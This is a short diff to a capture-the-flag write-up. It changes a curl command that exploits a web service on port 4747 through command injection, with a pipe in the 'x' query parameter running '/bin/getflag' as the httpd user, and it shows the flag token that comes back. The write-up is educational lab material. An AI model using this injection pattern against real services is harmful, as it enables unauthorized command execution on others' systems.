@@ -28,8 +28,7 @@ At this point, we know what the exploit is and we can execute `getflag` through 
 
 But `getflag` isn't being executed by the right user, httpd needs to execute it ;)
 
-On the host:
 ```bash
-curl "http://192.168.122.237:4747/?x=|/bin/getflag"
+curl 'http://localhost:4747/?x=|/bin/getflag'
 # -> Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
 ```
